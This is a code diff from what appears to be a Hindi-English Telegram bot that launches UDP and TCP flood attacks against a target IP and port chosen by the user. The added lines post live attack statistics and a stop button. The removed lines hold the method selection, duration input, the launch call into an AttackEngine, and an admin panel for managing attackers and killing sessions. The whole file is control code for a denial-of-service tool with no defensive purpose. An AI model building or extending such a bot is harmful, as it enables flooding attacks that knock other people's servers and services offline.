+            
+            if not stats.running:
+                break
+
+            try:
+                await self.bot.edit_message_text(
+                    chat_id=chat_id,
+                    message_id=message_id,
+                    text=(
+                        f"🚀 ATTACK IN PROGRESS\n\n"
+                        f"🎯 Target: {self.ctx.target_ip}:{self.ctx.target_port}\n"
+                        f"📤 Data Sent: {human_bytes(stats.bytes_sent)}\n"
+                        f"📦 Packets: {stats.sent_packets} sent / {stats.failed_packets} failed\n"
+                        f"⚡ RPS: {stats.rps:.2f}\n"
+                        f"⏱️ Elapsed: {stats.elapsed:.1f}s"
+                    ),
+                    reply_markup=InlineKeyboardMarkup([
+                        [InlineKeyboardButton("🛑 STOP ATTACK", callback_data="global_stop")]
+                    ])
                 )
             except Exception:
-                pass
+                pass  # Ignore edit errors
 
-        # ── Duration input ──
-        elif s.state == "await_dur":
-            if not raw.isdigit():
-                await _send(client, s, scr_err("Sirf number daalo bhai"), kb_back_method())
-                return
-            s.duration = min(int(raw), cfg.max_duration)
-            s.state    = "confirm"
-
-            # Check port based on method
-            port = 80
-            s.port = port
-            _, status = await check_ip(s.ip, port)
-
-            await _send(client, s,
-                scr_confirm(s.ip, s.port, s.duration, s.method, cfg.max_threads, status),
-                kb_confirm())
-
-        # ── Admin: add/rem ──
-        elif s.state == "adm_add":
-            if not raw.isdigit():
-                await _send(client, s, scr_err("User ID number hona chahiye"), kb_admin())
-                return
-            ADMIN_IDS.add(int(raw))
-            await _send(client, s, f"✅ `{raw}` admin ban gaya", kb_admin())
-            s.state = "idle"
-
-        elif s.state == "adm_rem":
-            if not raw.isdigit():
-                await _send(client, s, scr_err("User ID number hona chahiye"), kb_admin())
-                return
-            ADMIN_IDS.discard(int(raw))
-            await _send(client, s, f"✅ `{raw}` admin se hata diya", kb_admin())
-            s.state = "idle"
-
-        else:
-            adm = is_admin(uid, cfg)
-            await _send(client, s, scr_home(adm), kb_main(adm))
-
-
-    # callbacks
-    @bot.on_callback_query()
-    async def on_cb(client: Client, cb: CallbackQuery) -> None:
-        uid  = cb.from_user.id
-        s    = get_sess(uid)
-        s.chat_id = cb.message.chat.id
-        data = cb.data
-        adm  = is_admin(uid, cfg)
-        await cb.answer()
-
-        # ── Main ──
-        if data == "back_main":
-            s.state = "idle"
-            await _edit(cb.message, s, scr_home(adm), kb_main(adm))
-
-        elif data == "atk_start":
-            await _edit(cb.message, s, scr_method(), kb_method())
-
-        # ── Method ──
-        elif data == "m_udp":
-            s.method = "udp"
-            s.state  = "await_ip"
-            await _edit(cb.message, s, scr_await_ip("udp"), kb_back_main())
-
-        elif data == "m_tcp":
-            s.method = "tcp"
-            s.state  = "await_ip"
-            await _edit(cb.message, s, scr_await_ip("tcp"), kb_back_main())
-
-        elif data == "back_method":
-            s.state = "idle"
-            await _edit(cb.message, s, scr_method(), kb_method())
-
-        elif data == "back_dur":
-            s.state = "await_ip"
-            await _edit(cb.message, s, scr_await_ip(s.method), kb_back_main())
-
-        # ── Launch ──
-        elif data == "launch":
-            if s.state != "confirm":
-                await _edit(cb.message, s, scr_home(adm), kb_main(adm))
-                return
-            s.state = "attacking"
-            await _edit(cb.message, s,
-                scr_live(s.ip, s.port, s.duration, s.method, 0),
-                kb_live())
-            _launch(client, cb.message, s, cfg)
-
-        # ── Stats ──
-        elif data == "cb_stats":
-            if s.engine and s.engine.stats.running:
-                await _edit(cb.message, s,
-                    scr_stats(s.engine.stats, s.ip, s.port, s.method),
-                    kb_live())
-            else:
-                await _edit(cb.message, s, scr_idle(), kb_main(adm))
-
-        # ── Stop ──
-        elif data == "cb_stop":
-            await _abort(client, s, cb.message)
-
-        # ── Help ──
-        elif data == "cb_help":
-            await _edit(cb.message, s, scr_help(), kb_back_main())
-
-        # ── Admin panel ──
-        elif data == "admin_panel":
-            if not adm:
-                await cb.answer("❌ Tu admin nahi hai", show_alert=True)
-                return
-            active = sum(1 for ss in SESSIONS.values() if ss.engine and ss.engine.stats.running)
-            await _edit(cb.message, s, scr_admin(len(SESSIONS), active), kb_admin())
-
-        elif data == "adm_sessions":
-            if not adm:
-                return
-            lines = []
-            for uid2, ss in SESSIONS.items():
-                status = "⚡" if (ss.engine and ss.engine.stats.running) else "💤"
-                lines.append(f"{status} `{uid2}`")
-            text = "👥 **ꜱᴇꜱꜱɪᴏɴꜱ:**\n\n" + ("\n".join(lines) if lines else "Koi nahi")
-            await _edit(cb.message, s, text, kb_admin())
-
-        elif data == "adm_killall":
-            if not adm:
-                return
-            killed = 0
-            for ss in SESSIONS.values():
-                if ss.engine:
-                    ss.engine.stop()
-                    killed += 1
-                if ss.attack_task and not ss.attack_task.done():
-                    ss.attack_task.cancel()
-                ss.state = "idle"
-            await _edit(cb.message, s, f"🛑 **{killed} ᴀᴛᴛᴀᴄᴋꜱ ᴋɪʟʟ ʜᴏ ɢᴀʏᴇ**", kb_admin())
-
-        elif data == "adm_add":
-            if not adm:
-                return
-            s.state = "adm_add"
-            await _edit(cb.message, s, "➕ **Naya admin ka user ID bhejo:**", kb_admin())
-
-        elif data == "adm_rem":
-            if not adm:
-                return
-            s.state = "adm_rem"
-            await _edit(cb.message, s, "➖ **Hatane wale admin ka user ID bhejo:**", kb_admin())
-
-
-    def _launch(client: Client, cb_msg: Message, s: UserSession, cfg: Config) -> None:
-        engine  = AttackEngine(cfg.max_threads, cfg.max_duration)
-        s.engine = engine
-
-        async def _run() -> None:
-            try:
-                if s.method == "udp":
-                    stats = await engine.run_udp(s.ip, s.port, s.duration)
-                else:
-                    stats = await engine.run_tcp(s.ip, s.port, s.duration)
-                s.state = "idle"
-                try:
-                    await cb_msg.edit_text(
-                        scr_done(stats, s.ip, s.port, s.method),
-                        reply_markup=kb_main(is_admin(cb_msg.chat.id, cfg)),
-                    )
-                except Exception:
-                    pass
-            except asyncio.CancelledError:
-                pass
-            except Exception as exc:
-                LOGGER.exception("Attack error")
-                try:
-                    await cb_msg.edit_text(scr_err(str(exc)), reply_markup=kb_main())
-                except Exception:
-                    pass
-
-        s.attack_task = asyncio.create_task(_run())
+    def register_handlers(self):
+        """Additional handler registration if needed."""
+        pass
